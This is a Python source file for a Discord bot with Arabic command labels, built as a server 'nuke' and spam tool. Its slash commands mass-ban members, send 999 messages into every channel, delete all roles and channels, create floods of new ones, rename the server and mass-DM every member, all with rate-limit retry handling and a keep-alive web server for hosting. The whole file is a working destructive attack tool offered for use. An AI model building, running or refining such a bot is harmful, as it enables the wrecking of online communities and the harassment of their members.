import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import aiohttp
import os
from aiohttp import web

async def handle(request):
    return web.Response(text="Bot is active!")

app = web.Application()
app.router.add_get('/', handle)

async def start_web_server():
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True

class SecureSpeedBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        asyncio.create_task(start_web_server())

    async def on_ready(self):
        print(f'🚀 تم التشغيل: {self.user.name}')
        try:
            await self.tree.sync()
            print(f'✅ تمت المزامنة التلقائية!')
        except: pass

bot = SecureSpeedBot()

async def safe_execute(coro):
    try:
        return await coro
    except discord.HTTPException as e:
        if e.status == 429:
            await asyncio.sleep(e.retry_after + 0.1)
            return await coro
    except: return None

@bot.command(name="0197")
async def sync_cmd(ctx):
    await bot.tree.sync(guild=ctx.guild)
    await ctx.message.add_reaction("✅")

@bot.tree.command(name="ban", description="تبنيد الأعضاء - الحد 100k")
async def ban(interaction: discord.Interaction, count: int):
    await interaction.response.defer(ephemeral=False)
    members = [m for m in interaction.guild.members if m != bot.user and m != interaction.guild.owner][:min(count, 100000)]
    for m in members: asyncio.create_task(safe_execute(m.ban()))
    await interaction.followup.send("⚡ جاري تنفيذ الباند المتوازي...")

@bot.tree.command(name="ban_token", description="تبنيد الأعضاء الوهميين (التوكن) - الحد 100k")
async def ban_token(interaction: discord.Interaction, count: int):
    await interaction.response.defer(ephemeral=False)
    members = [m for m in interaction.guild.members if m != bot.user][:min(count, 100000)]
    for m in members: asyncio.create_task(safe_execute(m.ban()))
    await interaction.followup.send("⚡ جاري تصفية التوكنات...")

@bot.tree.command(name="name_server", description="تغيير اسم السيرفر")
async def name_server(interaction: discord.Interaction, name: str):
    await interaction.guild.edit(name=name)
    await interaction.response.send_message("✅ تم تغيير الاسم.", ephemeral=True)

@bot.tree.command(name="avatar_servrt", description="تغيير افتار السيرفر")
async def avatar_servrt(interaction: discord.Interaction, url: str):
    await interaction.response.defer(ephemeral=True)
    async with aiohttp.ClientSession() as s:
        async with s.get(url) as r:
            if r.status == 200: await interaction.guild.edit(icon=await r.read())
    await interaction.followup.send("✅ تم تغيير الأفتار.")

@bot.tree.command(name="message", description="سبام رسائل في الرومات")
@app_commands.choices(scope=[app_commands.Choice(name="كل الرومات", value="all"), app_commands.Choice(name="عدد محدد", value="custom")])
async def message(interaction: discord.Interaction, text: str, scope: str, count_channels: int = None):
    await interaction.response.defer(ephemeral=True)
    channels = interaction.guild.text_channels if scope == "all" else interaction.guild.text_channels[:count_channels]
    for c in channels:
        for _ in range(999): asyncio.create_task(safe_execute(c.send(text)))
    await interaction.followup.send("⚡ جاري السبام...")

@bot.tree.command(name="delete_role", description="حذف الرتب")
async def del_role(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    for r in interaction.guild.roles:
        if not r.is_default() and not r.managed: asyncio.create_task(safe_execute(r.delete()))
    await interaction.followup.send("✅ تم.")

@bot.tree.command(name="create_role", description="إنشاء رتب")
async def cre_role(interaction: discord.Interaction, name: str, count: int):
    await interaction.response.defer(ephemeral=True)
    for _ in range(min(count, 250)): asyncio.create_task(safe_execute(interaction.guild.create_role(name=name)))
    await interaction.followup.send("✅ تم.")

@bot.tree.command(name="delete_room", description="حذف عدد معين من الرومات")
@app_commands.describe(count="عدد الرومات المراد حذفها")
async def del_room(interaction: discord.Interaction, count: int):
    await interaction.response.defer(ephemeral=True)
    channels = interaction.guild.text_channels[:min(count, 499)]
    for c in channels: asyncio.create_task(safe_execute(c.delete()))
    await interaction.followup.send(f"✅ تم حذف {len(channels)} روم.")

@bot.tree.command(name="create_room", description="إنشاء رومات")
async def cre_room(interaction: discord.Interaction, name: str, count: int):
    await interaction.response.defer(ephemeral=True)
    for _ in range(min(count, 499)): asyncio.create_task(safe_execute(interaction.guild.create_text_channel(name=name)))
    await interaction.followup.send("✅ تم.")

@bot.tree.command(name="rooms", description="تطهير وإنشاء رومات")
async def rooms(interaction: discord.Interaction, name: str, count: int):
    await interaction.response.defer(ephemeral=True)
    for c in interaction.guild.text_channels: await safe_execute(c.delete())
    for _ in range(min(count, 499)): asyncio.create_task(safe_execute(interaction.guild.create_text_channel(name=name)))
    await interaction.followup.send("✅ تم.")

# أمر النشر السريع (آمن وبمعدل ~7 أعضاء بالثانية)
@bot.tree.command(name="nshr", description="نشر رسالة لجميع أعضاء السيرفر في الخاص بشكل سريع وآمن")
async def nshr(interaction: discord.Interaction, message: str):
    await interaction.response.defer(ephemeral=True)
    
    success_count = 0
    fail_count = 0
    
    if not interaction.guild.chunked:
        await interaction.guild.chunk()

    for member in interaction.guild.members:
        if member.bot:
            continue
        try:
            await member.send(message)
            success_count += 1
            await asyncio.sleep(0.14) # سرعة عالية وآمنة (حوالي 7 رسائل بالثانية)
        except:
            fail_count += 1

    await interaction.followup.send(f"✅ تم الانتهاء من النشر!\n📨 تم الإرسال بنجاح: {success_count}\n❌ فشل الإرسال: {fail_count}", ephemeral=True)

bot.run(os.getenv('TOKEN'))
